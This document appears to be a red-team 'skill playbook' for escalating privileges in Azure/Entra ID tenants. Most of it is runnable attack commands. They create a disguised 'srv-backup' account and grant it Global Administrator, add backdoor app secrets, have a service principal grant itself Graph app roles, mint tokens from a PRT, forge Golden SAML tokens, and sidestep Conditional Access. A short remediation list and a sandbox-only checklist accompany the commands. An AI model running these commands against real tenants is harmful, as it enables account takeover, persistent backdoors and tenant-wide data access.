# Azure Privilege Escalation — Skill Playbook

**Mitre ATT&CK ID:** T1078 (Valid Accounts), T1098 (Account Manipulation), T1528 (Steal Application Access Token), T1550.001 (Use Alternate Authentication Material), T1606.002 (Forge Web Credentials: SAML Tokens)
**OWASP Mapping:** A01:2021 – Broken Access Control, A07:2021 – Identification and Authentication Failures
**Severity:** Critical
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: azure-privesc-v1
category: azure-ad
cloud_provider: azure
author: HiveBreach
mitre_attack_id:
  - T1078
  - T1098
  - T1528
  - T1550.001
  - T1606.002
owasp_mapping:
  - A01:2021-Broken Access Control
  - A07:2021-Identification and Authentication Failures
tags:
  - azure
  - azure-ad
  - entra-id
  - privilege-escalation
  - roadtools
  - aadinternals
  - azure-ad-role-assignments
  - prtauth
tools:
  - roadrecon
  - roadtx
  - aadinternals
  - az-cli
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Enumerate Privileged Role Assignments

```bash
az login --allow-no-subscriptions
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal" \
  --query 'value[*].{Role:roleDefinitionId,Principal:principal.userPrincipalName,Dir:directoryScopeId}' --output table
```

### 1.2 Identify Escalation Enablers

```bash
# Permission-granting roles and app secrets
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions?\$select=displayName" \
  --query 'value[*].displayName' --output tsv | grep -iE 'admin|owner|privileged|app'

az rest --method GET --uri "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,passwordCredentials,keyCredentials" --output json
az rest --method GET --uri "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,keyCredentials" --output json
```

### 1.3 Exposed Credentials in App Registration

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/applications" --output json | \
  jq -r '.value[] | select(.passwordCredentials != [] or .keyCredentials != []) | .displayName'
az ad app credential list --id <app-id> -o json
```

---

## 2. Confirmation

### 2.1 Validate Current Token's Permissions

```bash
roadtx describe -t <JWT> | jq '{aud, appid, scp, exp}'
az account get-access-token --query '{Token:accessToken}' -o tsv | \
  python3 -c "import sys,base64,json; t=sys.stdin.read().split('.')[1]; t+='='*(-len(t)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(t)),indent=2))"
```

### 2.2 Confirm Pivot Targets (Graph -> ARM / FOCI)

```bash
roadtx refreshtokento -r azrm --foci
az rest --method GET --uri "https://management.azure.com/subscriptions?\$api-version=2022-12-01" \
  --headers 'Authorization=Bearer <azrm-token>' --query 'value[*].displayName' --output tsv
```

---

## 3. Exploitation

### 3.1 Azure AD Role Assignment Attack (Privileged Access)

```bash
# Victim with roleAssignment read + write (Global Admin / Priv Role Admin)
# Grant Global Admin to controlled account
az ad user create --display-name "srv-backup" \
  --user-principal-name "srv-backup@<domain>" --password "<Str0ng!>" \
  --force-change-password-next-sign-in false

az rest --method POST \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{"principalId":"<user-id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/"}'

# Escalate self: add current account to Privileged Role Administrator
# 62e90394... = Global Administrator; use these for lower noise:
# Priv Role Admin: e8611ab3-c189-46e8-94e1-60213ab1f814
```

### 3.2 App Registration Secret Backdoor

```bash
# Attack an app with elevated permissions; steal its secret, then:
az ad app credential reset --id <app-id> --append --years 2 -o json
# Attacker now acquires a token as the service principal:
az login --service-principal -u <app-id> -p '<new-secret>' --tenant <tenant-id> --allow-no-subscriptions
az rest --method GET --uri "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName" -o tsv
```

### 3.3 AppRoleAssignmentGrant — admin-consent token theft

```bash
# If current app has AppRoleAssignment.ReadWrite.All + admin consent ability,
# grant itself Application.ReadWrite.All and read every app secret:
az rest --method POST \
  --uri "https://graph.microsoft.com/v1.0/servicePrincipals/<sp-id>/appRoleAssignments" \
  --body '{"principalId":"<sp-id>","resourceId":"<graph-sp-id>","appRoleId":"<role-id>"}'
```

### 3.4 PRT-based Escalation (roadtx)

```bash
# With plaintext PRT (high-priv user device), mint tokens for any resource:
roadtx device -n redteam-device
roadtx prt -u user@<domain> -p 'Password' --key-pem key.pem --cert-pem cert.pem
roadtx prtauth -c msteams -r msgraph
roadtx getscope -s "https://graph.microsoft.com/RoleManagement.ReadWrite.Directory https://graph.microsoft.com/User.ReadWrite.All" --foci
```

### 3.5 AADInternals Role Grant (Silver/Default Admin)

```powershell
Import-Module AADInternals
Get-AADIntUsers
# Grant a controlled account a privileged role directly:
New-AADIntServicePrincipal -ServicePrincipalName srv-backup
# Golden SAML (token-signing cert in hand):
New-AADIntSAMLToken -ImmutableID $immutableID
New-AADIntKerberosTicket -SID <sid> -KDC <kdc> -Key <aes256>
```

### 3.6 Conditional Access / CA Bypass for Privesc Tools

```bash
# Legacy-auth bypass to re-trigger privesc paths:
# 1. ROPC (roadrecon auth -u/-p) for non-MFA-protected flows
# 2. Device-code (Teams 1fec8e78-bce4-4aaf-ab1b-5451cc387264)
# 3. Report-only policies are not enforced during testing window
```

---

## 4. Tool-Guidance

### 4.1 ROADtools

```bash
pip install roadrecon roadtx
roadrecon auth --device-code
roadrecon gather
roadrecon gui
roadtx gettokens -u u@<domain> -p 'Pass' -c azcli -r msgraph
roadtx refreshtokento -r azrm --foci
roadtx prt -u u@<domain> -p 'Pass' --key-pem key.pem --cert-pem cert.pem
```

### 4.2 AADInternals

```powershell
Install-Module AADInternals -Scope CurrentUser
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntUsers | Select UserPrincipalName, DirSyncEnabled
New-AADIntServicePrincipal -ServicePrincipalName redteam
```

### 4.3 AzureHound / Stormspotter

```bash
docker run -it --rm -e AZURE_TENANT_ID=<t> -e AZURE_CLIENT_ID=<c> \
  -e AZURE_CLIENT_SECRET=<s> specterops/azurehound collect -o ./ah.json
jq '.data[] | select(.kind=="AzureUser") | select(.properties.ownedObjects | length>0)' ah.json

docker run --rm -p 9091:9091 -v $(pwd):/stormspotter/data Stormspotter/Stormspotter:master
```

---

## 5. PoC Generation

### PoC Template

```markdown
## Azure Privesc — [FINDING_ID]

**Entry:** user@<domain> with <role> / app <appId> with <perms>
**Vector:** Role assignment / app secret / appRole grant / PRT / Golden SAML

### Proof
1. [token decrypt] `roadtx describe -t <JWT>`
2. [grant cmd] `az rest --method POST .../roleAssignments`
3. [impact] confirmed Global Admin on controlled account; dumped N users
4. [Screenshot of role list + resulting access]

### Impact
- Tenant-wide access (T1078)
- Account manipulation / persistence (T1098)

### Remediation
- Remove unneeded admin roles; use PIM (time-bound, approval)
- Rotate app secrets; monitor credential reset events (SigninLogs/AppRegistration)
- Enforce CA + device compliance; disable legacy protocols
- Monitor roleAssignments writes and appRoleAssignment grants
```

---

## 6. Verification

- [ ] All escalation performed only in sandbox tenant
- [ ] Token scope/aud claims validated before each privileged action
- [ ] Role grants reverted and audited after the test
- [ ] Findings reproduced with at least two independent tools
- [ ] PIM/approval flows verified (are standing roles actually present?)
- [ ] Log coverage confirmed (AuditLogs, SigninLogs) for post-test review
- [ ] No data exfiltration beyond proof screenshots/metadata

---

## 7. CheatSheet

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal" -o table
az rest --method POST --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{"principalId":"<id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/"}'
az ad app credential reset --id <app-id> --append --years 2
roadtx prtauth -c msteams -r msgraph
roadtx refreshtokento -r azrm --foci
roadtx describe -t <JWT>
```

| Vector | Prereq | Command |
|---|---|---|
| Role grant | roleAssignment.ReadWrite.All | az rest POST roleAssignments |
| App secret backdoor | AppCredentials.Write | az ad app credential reset |
| AppRole grant | AppRoleAssignment.RW | az rest POST appRoleAssignments |
| PRT token mint | PRT | roadtx prtauth |
| FOCI pivot | refresh token | roadtx refreshtokento |
| Golden SAML | token-signing cert | New-AADIntSAMLToken |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1078 | Valid Accounts | Using compromised identity |
| T1098 | Account Manipulation | Role/credential changes |
| T1528 | Steal Application Access Token | Token theft |
| T1550.001 | Use Alternate Authentication Material | PRT / FOCI exchange |
| T1606.002 | Forge Web Credentials: SAML Tokens | Golden SAML |
| T1556 | Modify Authentication Process | AADInternals hooks |
| T1484 | Domain Policy Modification | CA policy tampering |

---

## 9. References

- Dirkjanm, ROADtools & Azure privesc research: https://dirkjanm.io/
- AADInternals: https://github.com/Gerenios/AADInternals
- Azure AD role IDs: https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference
- TokenTactics: https://github.com/f-bader/TokenTactics
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- MITRE T1098: https://attack.mitre.org/techniques/T1098/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
